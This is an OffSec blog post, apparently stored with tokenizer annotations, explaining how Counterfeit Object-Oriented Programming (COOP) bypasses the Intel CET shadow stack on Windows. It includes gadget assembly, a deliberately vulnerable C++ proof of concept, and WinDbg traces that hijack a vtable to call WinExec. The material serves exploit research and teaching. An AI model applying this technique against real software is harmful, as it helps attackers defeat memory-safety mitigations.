{"signal": "title: Bypassing Intel CET with Counterfeit Objects | OffSec\nurl: https://www.offsec.com/offsec/bypassing-intel-cet-with-counterfeit-objects/\n\nBypassing Intel CET with Counterfeit Objects\n\n\n\n\n Matteo Malvica\n Content Developer\n\n\n\n\n\nSince its inception in 2005, return-oriented programming (ROP) has been the predominant avenue to thwart W^X mitigation during memory corruption exploitation.\nWhile Data Execution Prevention (DEP) has been engineered to block plain code injection attacks from specific memory areas, attackers have quickly adapted and instead of injecting an entire code payload, they resorted in reusing multiple code chunks from DEP-allowed memory pages, called ROP gadgets. These code chunks are taken from already existing code in the target application and chained together to resemble the desired attacker payload or to just disable DEP on a per page basis to allow the existing code payloads to run.\nTo permanently block ROP attacks, a new hardware-enforced Control Flow Integrity mitigation called Control Enforcement Technology (CET) has been developed by Intel and first shipped on Windows systems roughly two years ago.\nAt first, the advent of CET painted a bleak picture future for exploit developers and their reliance on ROP-based techniques. However, in 2015, a new code-reuse technique named Counterfeit Object-Oriented Programming (COOP) has been formulated in a paper which seemed quite promising in defeating Control-Flow Integrity (CFI) defenses.\nIn this blog, we’ll briefly cover how CFI mitigations works, including CET, and how we can leverage COOP to effectively bypass Intel CET on the latest Windows releases.\nForward-Edge and Backward-Edge CFI\nControl Flow Integrity mechanisms can be grouped into two main categories: forward-edge and backward-edge.\nForward-edge CFI, like Microsoft CFG, protects indirect function calls through the use of verified function addresses. For instance, if we overwrite the pointer dereferenced in a CALL [rax] instruction with a ROP gadget address, CFG will block\nour exploit by throwing an exception.\nConversely, backward-edge CFI like Intel’s CET protects a function’s return address by comparing it to a previously saved version of the address that is stored on the Shadow Stack. If the original return address gets overwritten during a memory corruption exploit, the address comparison will inevitably fail and the application will be terminated. Given that ROP-based attacks execute “RET” instructions without a prior “CALL” instruction, the running thread’s stack and the shadow stack values mismatch and so backward-edge CFI like CET effectively blocks this attack technique.\nIntel CET has been designed to mitigate ROP attacks through both the Shadow Stack and COP/JOP via Indirect Branch Tracking (IBT). However since the latter technology has not yet been implemented on Windows, in this blog post we are going to refer to “Intel CET” as the implementation with only Shadow Stack enabled.\nCET internals have been documented extensively in previous researches [6][7] and we have already demonstrated how the mitigation works and on which major software CET has been deployed. At the time of this writing the landscape hasn’t changed much and every major browser continues to run CET on every process except the renderer process. This means that the way CET is currently implemented is quite ineffective because the renderer process is the one that gets typically exploited.\nEven though CET is still not widely enforced on browsers we should expect it to be enforced on every process over the coming years. To avoid getting caught unprepared, as researchers, we should improve our tradecraft and constantly learn about newly developed attack angles. Additionally, no matter how impeding a mitigation might be, we need to broaden our horizon if we want to find any weaknesses.\n \nCounterfeiting Objects\nAs mentioned in this post’s premise, a novel code reuse technique named Counterfeit Object-Oriented Programming or COOP has been put together by Felix Schuster in 2015. We should note that this paper is quite theoretical. The technique has not been observed implemented in the wild or in disclosed exploits. Our goal for this blog post is to try to leverage this theoretical approach and implement it in a proof of concept in order to bypass Intel CET.\nThe main idea behind this technique is counterfeiting – that is crafting new objects in-memory from attacker-controlled payloads and to chain them together through virtual functions that are already present in the target application or in loaded libraries.\nEach virtual function contained in a counterfeit object is called a vfgadget and is responsible for performing a small task. Similarly to ROP, vfgadgets can perform tasks like populating a value into a register. However when grouped together, multiple vfgadgets can execute more advanced operations.\nAs no specific tools exist today to discover vfgadgets, they can be found through custom scripts such as IDAPython, using a process similar to ROP gadget discovery.\nSince vfgadgets are picked from a pool of CFG-valid functions we can mark them as legitimate, and their execution will not be blocked by CFG once we hijack an indirect call with one of them.\nIn addition, an interesting corollary is that Intel CET won’t be triggered since we won’t corrupt any function return address during the process of calling vfgadgets in sequence.\nAs illustrated in Schuster’s paper, a typical COOP payload begins with a foundational vfgadget that acts as the COOP’s main function. We’ll refer to it as Looper in this blog post. Once the attacker has assembled the counterfeit object in memory, the Looper vfgadget iterates over an array of other vfgadgets, carefully prearranged by the attacker, which will be invoked one by one. By aligning the vfgadgets in the counterfeit object in such a way, we’ll be able to call valid virtual functions in a controlled\nmanner.\nOnce the Looper is running, it can then call other vfgadgets that are responsible for executing specific operations, like Argument LoadersInvokers and Collectors. These vfgadgets will be stored at regular intervals within the the array accessed by the Looper.\nAn Argument Loader vfgadget populates a given register by loading a value into it. The value to be loaded will be stored inside the counterfeit object at an offset from the beginning of the fake object.\nOnce the registers are populated by one or more Argument Loaders, an Invoker vfgadget can be called to simply execute the function pointer of the target API.\nCollectors are gadgets that retrieve a value already present in a register, and save it back into the attacker’s counterfeit object (i.e. as a returned value from an invoked API).\nThe following graph sum-up the COOP attack strategy discussed so far.\n\nCOOP attack flow\nWe can arrange and mix different vfgadgets based on their availability and the desired APIs that we want to execute.\nIn order to better understand a COOP attack, let’s start by analyzing the main vfgadget, the Looper. The following assembly code provides a simplified version of a Looper COOP vfgadget:\n    mov      rbx, [rcx+0x40]\r\nloop_start:\r\n    mov      rax, [rbx]\r\n    call     cs:__guard_dispatch_icall_fptr\r\n    mov      rbx, [rbx+20h]\r\n    test     rbx, rbx\r\n    jnz      short loop_start\r\n    ...\r\nloop_exit:\r\n    ret\nLooper Gadget relevant ASM code\nOn the first line, RCX holds the this pointer and we load into RBX the start of the counterfeit object that has been placed at offset 0x40 from RCX. Since all the items in our counterfeit objects will be referenced at offsets from thethis pointer, we need to make sure to save its value before hijacking the program flow (i.e by corrupting a vtable).\nThe COOP payload base address is then dereferenced into RAX which points to the first vfgadget that gets called. Once the call returns, a new vfgadget is loaded at offset 0x20 from the previous gadget and if the content of RBX is not zero, a new iteration of the loop takes place.\nWhile writing our counterfeit object in memory, we need to align upfront each vfgadget to match the Looper offsets, similarly to the following layout:\n\nThe COOP buffer in memory\nHere, 00000227`26cd8900 is the base address of our COOP payload, which is stored at offset 0x40 from the this pointer (RCX). From the previous code listing, we notice at the first line of the _loopstart routine that the pointer gets dereferenced into RAX, which in turn points to the first vfgadget. On the next loop iteration the Looper repeats the same task by loading a pointer at offset 0x20 from the previous one and ultimately invokes the second vfgadget.\nWhen exploiting real-world targets such browsers, it is recommended to rely on the Looper vfgadget because it gives more control and stability over the other vfgadgets. However, for the sake of brevity, we wrote our vulnerable application with only a single Invoker vfgadget which accepts one argument, as we’ll see in the next section.\nHaving covered introductory COOP theory, let’s move on to exploiting a CET-compiled proof of concept application that we developed to showcase COOP attacks.\nBypassing the CET Shadow Stack with COOP\nThe vulnerable application we wrote is compiled with CET and CFG in addition to DEP, which is on by default.\nFirst off, to verify that CET is really enforced, we place a breakpoint on printf, inspect the call-stack, overwrite the return address and resume execution.\n0:000> bp printf\r\n0:000> g\r\n0:000> k\r\n# Child-SP RetAddr Call Site\r\n00 00000000`0014fde8 00000001`400180e8 coop!printf [C:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.19041.0\\ucrt\\stdio.h @ 956] \r\n01 00000000`0014fdf0 00000001`40018d54 coop!main+0x28 [C:\\Users\\uf0\\source\\repos\\COOP\\COOP\\coop.cpp @ 54] \r\n02 (Inline Function) --------`-------- coop!invoke_main+0x22 [D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 78] \r\n03 00000000`0014fef0 00007ffb`ec0a7034 coop!__scrt_common_main_seh+0x10c [D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 288] \r\n04 00000000`0014ff30 00007ffb`ecba2651 KERNEL32!BaseThreadInitThunk+0x14\r\n05 00000000`0014ff60 00000000`00000000 ntdll!RtlUserThreadStart+0x21\r\n0:000> dq 00000000`0014fde8 L1\r\n00000000`0014fde8 00000001`400180e8 \r\n0:000> eq 00000000`0014fde8 414141414141\r\n0:000> dq 00000000`0014fde8 L1\r\n00000000`0014fde8 00004141`414141411\r\n0:000> g\r\n(16c0.f68): Security check failure or stack buffer overrun - code c0000409 (!!! second chance !!!)\r\nSubcode: 0x39 FAST_FAIL_CONTROL_INVALID_RETURN_ADDRESS Shadow stack violation\r\ncoop!printf+0x56:\r\n00000001`400187e6 c3 ret\nVerifying that CET is enforced\nWe get confirmation that CET is enabled as we are immediately prompted with a Shadow Stack exception referring to an invalid return address.\nAs CET is a hardware-enforced mitigation, in order to trigger the above error we would need at least an 11th Generation Core ‘Tiger Lake’ CPU\nTo simulate a browser vulnerability, we can obtain RIP control by taking advantage of a type confusion vulnerability in the application that is triggered automatically when the application is executed.\nWhen we hit the trigger for the vulnerability, a vtable pointer gets corrupted by our input, leading to an indirect call that we have control over. We then hijack the vtable to make it point to our COOP buffer where our first (and only) vfgadget resides. As mentioned earlier, instead of using a Looper with nested vfgadget, for the sake of brevity, we opted to use a single gadget that features both the Invoker and Argument Loader components.\nAs part of the automated part of the exploit, in order to obtain the vfgadget’s this pointer, we have leaked the stack pointer and retrieved the this pointer as a static offset from the stack.\nOnce we have obtained the this pointer address, we prepare the address of the Windows API we want to invoke along with its arguments. This is done by writing both the Windows API address and the arguments at the required offsets inside the counterfeit object.\nBefore exploring the COOP payload in more detail, let’s first understand the PoC’s syntax by running it without any arguments.\n\r\nC:\\Users\\offsec\\source\\repos\\COOP\\x64\\Debug>coop.exe\r\n\r\n[-] SYNTAX:\r\ncoop.exe <COOP obj ptr> <1st vfgadget> <WinAPI> <API argument>\r\n\r\n[-] EXAMPLE - WinExec:\r\ncoop.exe 00001e000000 5086014001000000 40610fecfb7f0000 \"cmd.exe /C calc\"\r\n\r\n[-] EXAMPLE - LoadLibraryA:\r\ncoop.exe 00001e000000 5086014001000000 f0040becfb7f0000 \"edgehtml.dll\"\r\n\nGetting the PoC’s syntax\nThe application accepts four parameters: a pointer to our counterfeit object (COOP) buffer, the vfgadget address, the Windows API address and its arguments. The helper shows two simple use-cases but this can be of course expanded to invoke any CFG-allowed API (if the application is compiled with it).\nSince Windows DLLs will load at a random base address, it is required to calculate the desired API’s address beforehand.\nLet’s first inspect the C++ code of the object related to our vfgadget, and then explore its corresponding assembly from the compiled binary:\n\r\nclass OffSec {\r\npublic:\r\n    char* a;\r\n    int (*callback)(char* a);\r\n\r\npublic:\r\n    virtual void trigger(char* a1) {\r\n        callback(a);\r\n\r\n    }\r\n};\r\n\nThe ‘trigger’ method from which we derive the vfgadget\nThe class OffSec present in the project contains a trigger method which acts as a C-style function pointer that we can abuse to invoke any API we like, as we’ll see shortly. Then, the ‘OffSec’ class is instantiated in the main program routine so it gets loaded in memory along with its methods.\nTaking a closer look at the Invoker in the disassembler reveals a few interesting aspects.\n\nInvoker vfgadger\n \nStarting from the second to the fourth line, the this pointer, referenced by RCX, is first stored on the stack and then moved into RAX. Next, the value at offset 0x10 from RAX is dereferenced and moved into RAX. This value will be the API function pointer residing in our counterfeit object. Then at line 7 and 8 the first function argument is dereferenced at offset 0x8 from the this pointer and moved into RCX.\nAs we’ll soon discover, the vulnerable application will take care of these offsets once we have submitted the parameters from the command line.\nHaving covered the main building blocks of our attack chain, let’s try to run the PoC by passing the four arguments in order to gain code execution:\n\r\nC:\\> coop.exe 00001e000000 5086014001000000 40610fecfb7f0000 \"cmd.exe /C calc\"\r\n\nRunning the PoC application with all parameters\nWith the above command we provided the following parameters:00001e000000 as a storage buffer for our counterfeit object,5086014001000000 as the Invoker vfgadget in addition to40610fecfb7f0000 which is the WinExec memory address.\nAs a final argument we pass the WinExec string argument. Note that all memory addresses are passed in little-endian format.\nOnce started, the application halts immediately, allowing us to attach the debugger to it. Before doing so, we launch Process Explorer to verify that the binary is actually running with Intel CET enabled.\n\nVerifying that CET is enabled with Process Explorer\nUnder the “Stack Protection” column, Process Explorer confirms that CET is enforced for only the CET-compatible modules, meaning that the mitigation will be enforced for any module compiled with CET. This includes our application.\nOnce the debugger is attached, we place a breakpoint to the only indirect call present in the main function and continue execution.\n\r\n0:001> bp 00000001`4001847e\r\n0:001> bl\r\n     0 e Disable Clear  00000001`4001847e     0001 (0001)  0:**** coop!main+0x3d2\r\n0:001> u 00000001`4001847e L1\r\ncoop!main+0x3d2:\r\n00000001`4001847e ff159cbb0a00    call    qword ptr [coop!__guard_dispatch_icall_fptr (00000001`400c4020)]\r\n0:000> dq 0x1e0000 L1\r\n00000000`001e0000  00000001`400186a0 \r\n0:001> g\r\n\nBreaking at the Indirect Call\nWe placed a breakoint at main+0x3d2 and verified that we have indeed an indirect call at that address. Next we dump the content of our counterfeit object located at the static address 0x1e0000, which holds a pointer to our vfgadget at 00000001400186a0\nAt main+0x3d2 is where the type confusion bug ignites and allows us to take control over RIP. As soon as we hit the breakpoint we inspect the value residing at our COOP buffer, which should be the first Invoker vfgadget. We let the application continue and verify that we indeed hit our breakpoint.\n\r\nBreakpoint 0 hit\r\ncoop!main+0x3d2:\r\n00000001`4001847e ff159cbb0a00    call    qword ptr [coop!__guard_dispatch_icall_fptr (00000001`400c4020)] ds:00000001`400c4020={ntdll!LdrpDispatchUserCallTarget (00007ffb`ecbdc620)}\r\n0:000>t\r\nntdll!LdrpDispatchUserCallTarget:\r\n00007ffb`ecbdc620 4c8b1d814d0f00  mov     r11,qword ptr [ntdll!LdrSystemDllInitBlock+0xb8 (00007ffb`eccd13a8)] ds:00007ffb`eccd13a8=00007df600000000\r\n0:000> \r\nntdll!LdrpDispatchUserCallTarget+0x23:\r\n00007ff8`7c5fc643 48ffe0          jmp     rax {coop!OffSec::trigger (00000001`400186a0)}\r\n...\r\n0:000> \r\ncoop!OffSec::trigger:\r\n00000001`400186a0 4889542410      mov     qword ptr [rsp+10h],rdx ss:00000000`0014fdf8=0000000000612b77\r\n\nLanding on the first COOP vfgadget\nAfter tracing into the CFG LdrpDispatchUserCallTarge routine we jump to the Invoker vfgadget ‘OffSec::trigger”, proving that we have control over the program’s execution flow. We then continue tracing inside the vfgadget:\n\r\n0:000> t\r\n...\r\ncoop!OffSec::trigger+0x5:\r\n00000001`40018655 48894c2408      mov     qword ptr [rsp+8],rcx ss:00000000`0014fdf0=00000001400a1108\r\n0:000> dq rcx L1\r\n00000000`00590d80  00000000`001e0000\r\n0:000> t\r\ncoop!OffSec::trigger+0xa:\r\n00000001`4001865a 4883ec38        sub     rsp,38h\r\n0:000> \r\ncoop!OffSec::trigger+0xe:\r\n00000001`4001865e 488b442440      mov     rax,qword ptr [rsp+40h] ss:00000000`0014fdf0=0000000000590d80\r\n\nMoving the ‘this’ pointer into RAX\nIn the above listing, the Invoker first saves the this pointer from RCX into the stack, and we also verify that it points to the base of our COOP buffer. On the last instruction the ‘this’ pointer is loaded into RAX, which will be used as a reference to invoke the API and its argument:\n\r\n0:000> \r\ncoop!OffSec::trigger+0x13:\r\n00000001`40018663 488b4010        mov     rax,qword ptr [rax+10h] ds:00000000`00590d90={KERNEL32!WinExec (00007ffb`ec0f6140)}\r\n0:000> \r\ncoop!OffSec::trigger+0x17:\r\n00000001`40018667 4889442420      mov     qword ptr [rsp+20h],rax ss:00000000`0014fdd0=000000000000001f\r\n0:000> \r\ncoop!OffSec::trigger+0x1c:\r\n00000001`4001866c 488b442440      mov     rax,qword ptr [rsp+40h] ss:00000000`0014fdf0=0000000000590d80\r\n0:000> \r\ncoop!OffSec::trigger+0x21:\r\n00000001`40018671 488b4808        mov     rcx,qword ptr [rax+8] ds:00000000`00590d88=00000000001e0080\r\n0:000> dc 00000000001e0080\r\n00000000`001e0080  2e646d63 20657865 6320432f 00636c61  cmd.exe /C calc.\r\n...\r\n\nLoading WinExec parameters from the ‘this’ pointer\nFirst, at offset 0x10 we can see that WinExec address is loaded into RAX and then, three instructions later, the command parameter gets retrieved at offset 0x8.\nOnce we let execution continue, we invoke LdrpDispatchUserCallTarget again which in turn dispatches execution to WinExec and welcomes us with our calculator.\n\nSuccessfully Calling WinExec\nThis completes our brief proof-of-concept where we demonstrated that we can bypass the Intel CET Shadow Stack and obtain arbitrary code execution via a COOP attack by calling CFG-allowed functions while simultaneously avoiding corrupting any return address.\nThe Visual Studio project for this PoC application can be found at the following URL.\nConclusions\nIntel CET provides yet another strong defensive mechanism that surely steps up the exploit development game. Nonetheless, new attack pathways such as COOP can be adopted to circumvent this mitigation. As we learned so far, COOP vfgadgets are inherently allowed by CFG and so, in a real-world scenario they could be chained together to circumvent Intel CET and possibly other CFI mitigations.\n\n\nAbout The Author\n\nMatteo Malvica\n\r\n              Content Developer            \n\n\nMatteo Malvica is a content developer at Offensive Security focusing on vulnerability research, exploit development, reverse engineering and operating system internals.\n", "metadata": {"phasesDone": ["zone", "token", "content"]}, "asets": [{"type": "zone", "hasID": false, "hasSpan": true, "attrs": [{"name": "region_type", "type": "string", "aggregation": null}], "annots": [[0, 20272, "body"]]}, {"type": "lex", "hasID": false, "hasSpan": true, "attrs": [], "annots": [[0, 5], [5, 6], [7, 16], [17, 22], [23, 26], [27, 31], [32, 43], [44, 51], [52, 53], [54, 60], [61, 64], [64, 65], [66, 71], [71, 74], [74, 77], [77, 78], [78, 84], [84, 85], [85, 88], [88, 89], [89, 95], [95, 96], [96, 140], [140, 141], [143, 152], [153, 158], [159, 162], [163, 167], [168, 179], [180, 187], [193, 199], [200, 207], [209, 216], [217, 226], [232, 237], [238, 241], [242, 251], [252, 254], [255, 259], [259, 260], [261, 276], [277, 288], [289, 290], [290, 293], [293, 294], [295, 298], [299, 303], [304, 307], [308, 319], [320, 326], [327, 329], [330, 336], [337, 340], [341, 351], [352, 358], [359, 365], [366, 376], [377, 389], [389, 390], [391, 396], [397, 401], [402, 411], [412, 422], [423, 424], [424, 427], [427, 428], [429, 432], [433, 437], [438, 448], [449, 451], [452, 457], [458, 463], [464, 468], [469, 478], [479, 486], [487, 491], [492, 500], [501, 507], [508, 513], [513, 514], [515, 524], [525, 529], [530, 537], [538, 545], [546, 549], [550, 557], [558, 560], [561, 570], [571, 573], [574, 580], [581, 585], [586, 593], [593, 594], [595, 599], [600, 608], [609, 611], [612, 619], [620, 628], [629, 633], [634, 640], [641, 645], [646, 657], [658, 664], [665, 670], [670, 671], [672, 678], [679, 682], [683, 690], [690, 691], [692, 697], [698, 702], [703, 709], [710, 713], [714, 719], [720, 724], [725, 732], [733, 741], [742, 746], [747, 749], [750, 753], [754, 760], [761, 772], [773, 776], [777, 784], [785, 793], [794, 796], [797, 805], [806, 809], [810, 817], [818, 826], [827, 834], [835, 837], [838, 840], [841, 845], [846, 853], [854, 857], [858, 860], [861, 862], [863, 866], [867, 871], [872, 877], [878, 880], [881, 886], [887, 890], [891, 899], [900, 904], [905, 913], [914, 916], [917, 920], [920, 921], [922, 924], [925, 936], [937, 942], [943, 946], [947, 954], [954, 955], [956, 957], [958, 961], [962, 979], [980, 987], [988, 992], [993, 1002], [1003, 1013], [1014, 1020], [1021, 1028], [1029, 1040], [1041, 1051], [1052, 1053], [1053, 1056], [1056, 1057], [1058, 1061], [1062, 1066], [1067, 1076], [1077, 1079], [1080, 1085], [1086, 1089], [1090, 1095], [1096, 1103], [1104, 1106], [1107, 1114], [1115, 1122], [1123, 1130], [1131, 1134], [1135, 1140], [1141, 1144], [1144, 1145], [1146, 1148], [1149, 1154], [1154, 1155], [1156, 1159], [1160, 1166], [1167, 1169], [1170, 1173], [1174, 1181], [1182, 1183], [1184, 1189], [1190, 1197], [1198, 1204], [1205, 1208], [1209, 1216], [1217, 1227], [1228, 1231], [1232, 1237], [1238, 1246], [1247, 1249], [1250, 1259], [1260, 1270], [1270, 1271], [1272, 1279], [1279, 1280], [1281, 1283], [1284, 1288], [1288, 1289], [1290, 1291], [1292, 1295], [1296, 1306], [1307, 1316], [1317, 1322], [1323, 1334], [1335, 1350], [1351, 1362], [1363, 1364], [1364, 1368], [1368, 1369], [1370, 1373], [1374, 1378], [1379, 1389], [1390, 1392], [1393, 1394], [1395, 1400], [1401, 1406], [1407, 1413], [1414, 1419], [1420, 1429], [1430, 1432], [1433, 1442], [1443, 1455], [1456, 1465], [1466, 1467], [1467, 1470], [1470, 1471], [1472, 1480], [1480, 1481], [1482, 1484], [1485, 1489], [1490, 1494], [1494, 1495], [1496, 1501], [1502, 1509], [1510, 1515], [1516, 1519], [1520, 1523], [1524, 1535], [1536, 1541], [1541, 1542], [1543, 1552], [1553, 1556], [1556, 1557], [1558, 1561], [1562, 1565], [1566, 1568], [1569, 1572], [1573, 1581], [1582, 1586], [1587, 1589], [1590, 1601], [1602, 1608], [1609, 1614], [1615, 1618], [1619, 1621], [1622, 1625], [1626, 1632], [1633, 1640], [1641, 1649], [1649, 1650], [1651, 1663], [1664, 1667], [1668, 1681], [1682, 1685], [1686, 1693], [1694, 1698], [1699, 1708], [1709, 1719], [1720, 1723], [1724, 1726], [1727, 1734], [1735, 1739], [1740, 1743], [1744, 1748], [1749, 1759], [1759, 1760], [1761, 1773], [1774, 1777], [1778, 1791], [1791, 1792], [1793, 1805], [1806, 1809], [1809, 1810], [1811, 1815], [1816, 1825], [1826, 1829], [1829, 1830], [1831, 1839], [1840, 1848], [1849, 1857], [1858, 1863], [1864, 1871], [1872, 1875], [1876, 1879], [1880, 1882], [1883, 1891], [1892, 1900], [1901, 1910], [1910, 1911], [1912, 1915], [1916, 1924], [1924, 1925], [1926, 1928], [1929, 1931], [1932, 1941], [1942, 1945], [1946, 1953], [1954, 1966], [1967, 1969], [1970, 1971], [1972, 1976], [1977, 1982], [1983, 1994], [1995, 1999], [2000, 2001], [2002, 2005], [2006, 2012], [2013, 2020], [2020, 2021], [2022, 2025], [2026, 2030], [2031, 2036], [2037, 2040], [2041, 2048], [2049, 2051], [2052, 2060], [2061, 2063], [2064, 2073], [2073, 2074], [2075, 2085], [2085, 2086], [2087, 2100], [2101, 2104], [2105, 2109], [2110, 2117], [2118, 2121], [2122, 2130], [2131, 2132], [2133, 2143], [2144, 2150], [2151, 2158], [2159, 2161], [2162, 2171], [2172, 2174], [2175, 2177], [2178, 2179], [2180, 2190], [2191, 2196], [2197, 2204], [2205, 2207], [2208, 2211], [2212, 2219], [2220, 2224], [2225, 2227], [2228, 2234], [2235, 2237], [2238, 2241], [2242, 2248], [2249, 2254], [2254, 2255], [2256, 2258], [2259, 2262], [2263, 2271], [2272, 2278], [2279, 2286], [2287, 2291], [2292, 2303], [2304, 2310], [2311, 2312], [2313, 2319], [2320, 2330], [2331, 2338], [2338, 2339], [2340, 2343], [2344, 2351], [2352, 2362], [2363, 2367], [2368, 2378], [2379, 2383], [2384, 2387], [2388, 2391], [2392, 2403], [2404, 2408], [2409, 2411], [2412, 2422], [2422, 2423], [2424, 2429], [2430, 2434], [2435, 2444], [2445, 2452], [2453, 2460], [2461, 2466], [2467, 2479], [2480, 2487], [2488, 2489], [2490, 2495], [2496, 2502], [2503, 2514], [2514, 2515], [2516, 2519], [2520, 2527], [2528, 2536], [2537, 2542], [2543, 2546], [2547, 2550], [2551, 2557], [2558, 2563], [2564, 2570], [2571, 2579], [2580, 2583], [2584, 2586], [2587, 2600], [2601, 2604], [2605, 2609], [2610, 2613], [2614, 2625], [2626, 2632], [2633, 2637], [2638, 2644], [2645, 2654], [2654, 2655], [2656, 2661], [2662, 2665], [2666, 2669], [2670, 2674], [2675, 2683], [2684, 2686], [2687, 2695], [2696, 2699], [2700, 2707], [2708, 2715], [2716, 2720], [2721, 2724], [2725, 2731], [2732, 2737], [2738, 2741], [2742, 2745], [2745, 2746], [2746, 2749], [2750, 2753], [2754, 2762], [2763, 2769], [2770, 2778], [2779, 2780], [2780, 2783], [2783, 2785], [2786, 2793], [2794, 2799], [2800, 2803], [2804, 2810], [2811, 2821], [2822, 2825], [2826, 2829], [2830, 2833], [2834, 2838], [2839, 2850], [2851, 2853], [2854, 2861], [2861, 2862], [2863, 2865], [2866, 2870], [2871, 2875], [2876, 2880], [2881, 2883], [2884, 2887], [2888, 2893], [2894, 2896], [2897, 2902], [2903, 2905], [2906, 2912], [2913, 2917], [2918, 2920], [2921, 2924], [2925, 2939], [2940, 2944], [2945, 2949], [2950, 2956], [2957, 2962], [2963, 2970], [2970, 2971], [2972, 2975], [2976, 2985], [2986, 2990], [2991, 2995], [2996, 3006], [3007, 3018], [3019, 3021], [3022, 3030], [3031, 3041], [3042, 3043], [3043, 3044], [3044, 3046], [3046, 3047], [3047, 3048], [3049, 3052], [3053, 3055], [3056, 3060], [3061, 3068], [3069, 3081], [3082, 3085], [3086, 3089], [3090, 3100], [3101, 3106], [3107, 3110], [3111, 3113], [3114, 3119], [3120, 3125], [3126, 3134], [3135, 3138], [3139, 3142], [3143, 3147], [3148, 3156], [3156, 3157], [3158, 3160], [3161, 3164], [3165, 3169], [3170, 3172], [3173, 3177], [3178, 3185], [3186, 3189], [3190, 3199], [3200, 3206], [3207, 3214], [3215, 3219], [3220, 3223], [3224, 3229], [3230, 3235], [3236, 3243], [3244, 3253], [3254, 3256], [3257, 3260], [3261, 3264], [3265, 3267], [3268, 3273], [3274, 3281], [3282, 3288], [3289, 3292], [3293, 3301], [3302, 3309], [3309, 3310], [3311, 3315], [3316, 3321], [3322, 3326], [3327, 3330], [3331, 3334], [3335, 3338], [3339, 3341], [3342, 3351], [3352, 3363], [3364, 3366], [3367, 3372], [3373, 3384], [3385, 3392], [3393, 3396], [3397, 3405], [3406, 3413], [3414, 3416], [3417, 3420], [3421, 3424], [3425, 3429], [3430, 3434], [3435, 3444], [3445, 3454], [3454, 3455], [3456, 3460], [3461, 3467], [3468, 3471], [3472, 3474], [3475, 3480], [3481, 3484], [3485, 3491], [3492, 3500], [3501, 3503], [3504, 3512], [3513, 3515], [3516, 3522], [3523, 3529], [3530, 3532], [3533, 3535], [3536, 3538], [3539, 3547], [3548, 3550], [3551, 3556], [3557, 3564], [3565, 3569], [3570, 3573], [3574, 3580], [3581, 3586], [3586, 3587], [3588, 3590], [3591, 3596], [3597, 3604], [3605, 3611], [3612, 3622], [3622, 3623], [3624, 3626], [3627, 3638], [3638, 3639], [3640, 3642], [3643, 3649], [3650, 3657], [3658, 3661], [3662, 3672], [3673, 3676], [3677, 3687], [3688, 3693], [3694, 3699], [3700, 3705], [3706, 3715], [3716, 3722], [3723, 3729], [3729, 3730], [3731, 3743], [3743, 3744], [3745, 3747], [3748, 3754], [3755, 3758], [3759, 3767], [3768, 3769], [3770, 3780], [3781, 3786], [3787, 3789], [3789, 3790], [3791, 3793], [3794, 3798], [3799, 3801], [3802, 3809], [3810, 3813], [3814, 3821], [3822, 3824], [3825, 3827], [3828, 3832], [3833, 3835], [3836, 3840], [3841, 3844], [3845, 3855], [3855, 3856], [3859, 3873], [3874, 3881], [3882, 3884], [3885, 3894], [3895, 3897], [3898, 3902], [3903, 3909], [3910, 3917], [3917, 3918], [3919, 3920], [3921, 3926], [3927, 3931], [3932, 3937], [3938, 3947], [3948, 3953], [3954, 3965], [3966, 3981], [3982, 3993], [3994, 3996], [3997, 4001], [4002, 4005], [4006, 4010], [4011, 4014], [4015, 4023], [4024, 4026], [4027, 4032], [4033, 4041], [4042, 4044], [4045, 4049], [4049, 4050], [4051, 4053], [4054, 4060], [4061, 4065], [4066, 4070], [4071, 4075], [4076, 4081], [4082, 4084], [4085, 4090], [4091, 4102], [4102, 4103], [4104, 4107], [4108, 4117], [4118, 4121], [4122, 4125], [4126, 4130], [4131, 4139], [4140, 4151], [4152, 4154], [4155, 4158], [4159, 4163], [4164, 4166], [4167, 4169], [4170, 4179], [4180, 4188], [4188, 4189], [4190, 4193], [4194, 4198], [4199, 4202], [4203, 4207], [4208, 4212], [4213, 4217], [4218, 4220], [4221, 4223], [4224, 4227], [4228, 4230], [4231, 4239], [4240, 4244], [4245, 4256], [4257, 4265], [4266, 4269], [4270, 4279], [4280, 4282], [4283, 4285], [4286, 4287], [4288, 4293], [4294, 4296], [4297, 4304], [4305, 4307], [4308, 4313], [4314, 4316], [4317, 4323], [4324, 4329], [4330, 4333], [4333, 4334], [4335, 4338], [4339, 4343], [4344, 4348], [4349, 4355], [4356, 4360], [4361, 4370], [4371, 4373], [4374, 4388], [4389, 4390], [4391, 4395], [4396, 4398], [4399, 4407], [4408, 4411], [4412, 4419], [4420, 4429], [4430, 4434], [4435, 4454], [4455, 4463], [4464, 4467], [4468, 4470], [4471, 4476], [4477, 4481], [4482, 4490], [4491, 4498], [4499, 4506], [4507, 4516], [4517, 4521], [4522, 4525], [4526, 4533], [4534, 4541], [4542, 4544], [4545, 4548], [4549, 4555], [4556, 4567], [4568, 4570], [4571, 4573], [4574, 4580], [4581, 4590], [4590, 4591], [4592, 4596], [4597, 4604], [4605, 4613], [4614, 4623], [4624, 4626], [4627, 4628], [4629, 4640], [4641, 4647], [4648, 4650], [4651, 4657], [4658, 4659], [4660, 4668], [4669, 4672], [4673, 4675], [4676, 4687], [4688, 4691], [4692, 4702], [4703, 4704], [4705, 4710], [4711, 4715], [4715, 4716], [4717, 4726], [4727, 4729], [4730, 4733], [4733, 4734], [4735, 4744], [4745, 4748], [4749, 4756], [4757, 4762], [4763, 4767], [4768, 4778], [4779, 4780], [4781, 4786], [4787, 4791], [4792, 4793], [4794, 4802], [4802, 4803], [4804, 4811], [4812, 4816], [4817, 4824], [4825, 4833], [4833, 4834], [4835, 4843], [4844, 4853], [4854, 4857], [4858, 4865], [4866, 4870], [4871, 4879], [4880, 4890], [4890, 4891], [4892, 4894], [4895, 4897], [4898, 4906], [4907, 4912], [4913, 4918], [4919, 4924], [4925, 4927], [4928, 4936], [4937, 4946], [4946, 4947], [4948, 4952], [4953, 4956], [4957, 4959], [4960, 4965], [4966, 4973], [4974, 4980], [4981, 4988], [4989, 4993], [4994, 4996], [4997, 5006], [5006, 5007], [5008, 5013], [5014, 5015], [5016, 5023], [5024, 5031], [5032, 5034], [5035, 5038], [5039, 5045], [5046, 5055], [5055, 5056], [5057, 5062], [5063, 5072], [5073, 5076], [5077, 5083], [5084, 5088], [5089, 5090], [5091, 5095], [5096, 5098], [5099, 5108], [5109, 5118], [5119, 5121], [5122, 5125], [5126, 5130], [5131, 5135], [5136, 5138], 